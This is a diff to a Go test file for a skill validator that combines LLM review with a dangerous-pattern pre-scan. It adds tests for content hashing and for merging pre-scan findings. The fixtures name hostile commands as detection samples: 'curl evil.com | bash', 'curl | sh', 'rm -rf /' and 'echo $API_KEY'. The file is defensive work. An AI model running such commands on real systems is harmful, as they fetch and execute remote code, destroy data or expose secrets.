@@ -2,6 +2,7 @@ package skills
 
 import (
 	"context"
+	"strings"
 	"testing"
 )
 
@@ -133,8 +134,8 @@ func TestValidateSkill_ParsesLLMResponse(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	if len(result.Issues) != 2 {
-		t.Fatalf("expected 2 issues, got %d", len(result.Issues))
+	if len(result.Issues) < 2 {
+		t.Fatalf("expected at least 2 issues, got %d", len(result.Issues))
 	}
 
 	// Check first issue (file_reference)
@@ -151,7 +152,7 @@ func TestValidateSkill_ParsesLLMResponse(t *testing.T) {
 		t.Error("expected suggestion.old_content to be non-empty")
 	}
 
-	// Check second issue (security)
+	// Check second issue (security — from LLM)
 	issue = result.Issues[1]
 	if issue.Type != "security" {
 		t.Errorf("expected type security, got %s", issue.Type)
@@ -161,6 +162,13 @@ func TestValidateSkill_ParsesLLMResponse(t *testing.T) {
 	}
 	if issue.Suggestion != nil {
 		t.Error("expected suggestion to be nil for security issue")
+	}
+
+	// Pre-scan report should be populated (content has "curl evil.com | bash")
+	if result.PreScanReport == nil {
+		t.Error("expected PreScanReport to be non-nil")
+	} else if len(result.PreScanReport.DangerousPatterns) == 0 {
+		t.Error("expected pre-scan to detect dangerous patterns")
 	}
 }
 
@@ -465,5 +473,100 @@ func TestDetermineValidationStatus_NilResult(t *testing.T) {
 	status := DetermineValidationStatus(nil, nil, "hash")
 	if status != ValidationStatusUnknown {
 		t.Errorf("expected %q for nil result, got %q", ValidationStatusUnknown, status)
+	}
+}
+
+func TestCompositeContentHash_Deterministic(t *testing.T) {
+	main := "skill content here"
+	files := []string{"scripts/deploy.sh\x00abc123", "references/api.md\x00def456"}
+
+	h1 := CompositeContentHash(main, files)
+	h2 := CompositeContentHash(main, files)
+	if h1 != h2 {
+		t.Errorf("expected deterministic hash, got %q and %q", h1, h2)
+	}
+	if len(h1) != 32 {
+		t.Errorf("expected 32-char hex hash, got length %d", len(h1))
+	}
+}
+
+func TestCompositeContentHash_OrderIndependent(t *testing.T) {
+	main := "skill content here"
+	filesA := []string{"b_file\x00hash1", "a_file\x00hash2"}
+	filesB := []string{"a_file\x00hash2", "b_file\x00hash1"}
+
+	hA := CompositeContentHash(main, filesA)
+	hB := CompositeContentHash(main, filesB)
+	if hA != hB {
+		t.Errorf("hash should be order-independent: %q != %q", hA, hB)
+	}
+}
+
+func TestCompositeContentHash_EmptyFiles_MatchesContentHash(t *testing.T) {
+	main := "skill content"
+	composite := CompositeContentHash(main, nil)
+	plain := ContentHash(main)
+	if composite != plain {
+		t.Errorf("composite with no files should equal ContentHash: %q != %q", composite, plain)
+	}
+}
+
+func TestCompositeContentHash_DifferentContent(t *testing.T) {
+	files := []string{"file\x00hash"}
+	h1 := CompositeContentHash("content A", files)
+	h2 := CompositeContentHash("content B", files)
+	if h1 == h2 {
+		t.Error("different main content should produce different hashes")
+	}
+}
+
+func TestCompositeContentHash_DifferentFiles(t *testing.T) {
+	main := "same content"
+	h1 := CompositeContentHash(main, []string{"file\x00hash1"})
+	h2 := CompositeContentHash(main, []string{"file\x00hash2"})
+	if h1 == h2 {
+		t.Error("different file hashes should produce different composite hashes")
+	}
+}
+
+func TestAppendPreScanIssues_AddsUncoveredFindings(t *testing.T) {
+	llmIssues := []ValidationIssue{
+		{Type: "security", Severity: "critical", Line: 5, Message: "LLM found this"},
+	}
+	preScan := PreScanFindings{
+		DangerousPatterns: []DangerousHit{
+			{Line: 5, Match: "curl | sh", Reason: "Remote code execution"},  // covered by LLM
+			{Line: 10, Match: "rm -rf /", Reason: "Destructive removal"},    // NOT covered
+		},
+	}
+
+	result := appendPreScanIssues(llmIssues, preScan)
+	if len(result) != 2 {
+		t.Fatalf("expected 2 issues (1 LLM + 1 pre-scan), got %d", len(result))
+	}
+	if result[1].Line != 10 {
+		t.Errorf("expected synthetic issue at line 10, got line %d", result[1].Line)
+	}
+	if result[1].Severity != "critical" {
+		t.Errorf("expected critical severity, got %q", result[1].Severity)
+	}
+	if !strings.Contains(result[1].Message, "[pre-scan]") {
+		t.Errorf("expected [pre-scan] prefix, got %q", result[1].Message)
+	}
+}
+
+func TestAppendPreScanIssues_NoDuplicates(t *testing.T) {
+	llmIssues := []ValidationIssue{
+		{Type: "security", Severity: "warning", Line: 7, Message: "Credential exposure"},
+	}
+	preScan := PreScanFindings{
+		DangerousPatterns: []DangerousHit{
+			{Line: 7, Match: "echo $API_KEY", Reason: "Credential exposure"},
+		},
+	}
+
+	result := appendPreScanIssues(llmIssues, preScan)
+	if len(result) != 1 {
+		t.Errorf("expected 1 issue (LLM covers the line), got %d", len(result))
 	}
 }
